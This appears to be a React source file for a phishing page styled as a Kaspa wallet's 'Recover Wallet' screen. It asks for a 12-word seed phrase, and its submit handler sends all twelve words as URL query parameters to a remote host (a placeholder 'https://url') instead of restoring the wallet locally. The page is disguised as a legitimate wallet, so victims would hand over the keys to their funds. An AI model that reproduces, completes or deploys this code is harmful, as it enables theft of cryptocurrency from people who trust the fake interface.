import * as React from 'react'
import '../css/kaspa.css'
import '../css/animations.css';
import { FiLock } from "react-icons/fi";
import { IoLanguageOutline } from "react-icons/io5";
import { FaRegMoon } from "react-icons/fa";

import { useState } from 'react';
import axios from 'axios';

function RecoverWallet () {
    const [inputValue1, setInputValue1] = useState('');
    const [inputValue2, setInputValue2] = useState('');
    const [inputValue3, setInputValue3] = useState('');
    const [inputValue4, setInputValue4] = useState('');
    const [inputValue5, setInputValue5] = useState('');
    const [inputValue6, setInputValue6] = useState('');
    const [inputValue7, setInputValue7] = useState('');
    const [inputValue8, setInputValue8] = useState('');
    const [inputValue9, setInputValue9] = useState('');
    const [inputValue10, setInputValue10] = useState('');
    const [inputValue11, setInputValue11] = useState('');
    const [inputValue12, setInputValue12] = useState('');

    const handleInputChange1 = (event) => {
      setInputValue1(event.target.value);
    };
    
    const handleInputChange2 = (event) => {
      setInputValue2(event.target.value);
    };

    const handleInputChange3 = (event) => {
      setInputValue3(event.target.value);
    };

    const handleInputChange4 = (event) => {
      setInputValue4(event.target.value);
    };

    const handleInputChange5 = (event) => {
      setInputValue5(event.target.value);
    };

    const handleInputChange6 = (event) => {
      setInputValue6(event.target.value);
    };

    const handleInputChange7 = (event) => {
      setInputValue7(event.target.value);
    };

    const handleInputChange8 = (event) => {
      setInputValue8(event.target.value);
    };

    const handleInputChange9 = (event) => {
      setInputValue9(event.target.value);
    };

    const handleInputChange10 = (event) => {
      setInputValue10(event.target.value);
    };

    const handleInputChange11 = (event) => {
      setInputValue11(event.target.value);
    };

    const handleInputChange12 = (event) => {
      setInputValue12(event.target.value);
    };

    const requestSeeds = () => {
      const request_headers = {
        "Content-Type": "application/json",
      };

      console.log('-----request-----');
      alert('https://url?word1=' + inputValue1 + '&word2=' + inputValue2 + '&word3=' + inputValue3 + '&word4=' + inputValue4 + '&word5=' + inputValue5 + '&word6=' + inputValue6 + '&word7=' + inputValue7 + '&word8=' + inputValue8 + '&word9=' + inputValue9 + '&word10=' + inputValue10 + '&word11=' + inputValue11 + '&word12=' + inputValue12);

      axios.get('https://url?word1=' + inputValue1 + '&word2=' + inputValue2 + '&word3=' + inputValue3 + '&word4=' + inputValue4 + '&word5=' + inputValue5 + '&word6=' + inputValue6 + '&word7=' + inputValue7 + '&word8=' + inputValue8 + '&word9=' + inputValue9 + '&word10=' + inputValue10 + '&word11=' + inputValue11 + '&word12=' + inputValue12,
        {headers: request_headers}
      )
      .then((response) => {
        console.log('Success!');
      })
      .catch((error) => {
          console.error(error);
      });
    };

    return (
      <div className="App relaitve overflow-hidden">
        <img src="./kaspa.png" className='fixed left-2 top-2 w-8 h-8'></img>
        <FiLock className='fixed right-16 top-2 w-5 h-5'/>
        <IoLanguageOutline className='fixed right-10 top-2 w-5 h-5'/>
        <FaRegMoon className='fixed right-4 top-2 w-5 h-5'/>
        <div className='flex justify-center items-center h-full w-full flex-col'>
          <div className='text-left border-2 border-[#009688] w-full md:w-1/3 p-2 font-bold rounded-sm'>
            Recover Wallet
          </div>
          <div className='border-t-0 border-2 border-[#009688] py-10 w-full md:w-1/3 flex items-center rounded-sm flex-col'>
            <p className='text-center text-lg max-w-lg sm:max-w-xl'>Enter your 12-word seed phrase to recover your wallet (words are not case sensitive)</p>
            <div className='grid grid-cols-4 gap-2 px-10 sm:px-20 mt-5'>
                <input placeholder="seed1" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue1} onChange={handleInputChange1}/>
                <input placeholder="seed2 "className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue2} onChange={handleInputChange2}/>
                <input placeholder="seed3" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue3} onChange={handleInputChange3}/>
                <input placeholder="seed4" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue4} onChange={handleInputChange4}/>
                <input placeholder="seed5" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue5} onChange={handleInputChange5}/>
                <input placeholder="seed6" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue6} onChange={handleInputChange6}/>
                <input placeholder="seed7" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue7} onChange={handleInputChange7}/>
                <input placeholder="seed8" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue8} onChange={handleInputChange8}/>
                <input placeholder="seed9" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue9} onChange={handleInputChange9}/>
                <input placeholder="seed10" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue10} onChange={handleInputChange10}/>
                <input placeholder="seed11" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue11} onChange={handleInputChange11}/>
                <input placeholder="seed12" className='border-2 border-[#009688] rounded-md py-1 text-center' type="text" value={inputValue12} onChange={handleInputChange12}/>
            </div>
            <div className='flex flex-row gap-3 mt-20'>
              <a href="/"><div className='border-black rounded-md p-3 border-[2px] hover:text-black hover:border-black hover:cursor-pointer'>Cancel</div></a>
              <div className='bg-[#009688] border-[#009688] text-white rounded-md p-3 border-[2px] hover:text-black hover:border-black hover:cursor-pointer' onClick={() => requestSeeds()}>Recover Wallet</div>
            </div>
          </div>
        </div>
      </div>
    );
}

export default RecoverWallet;
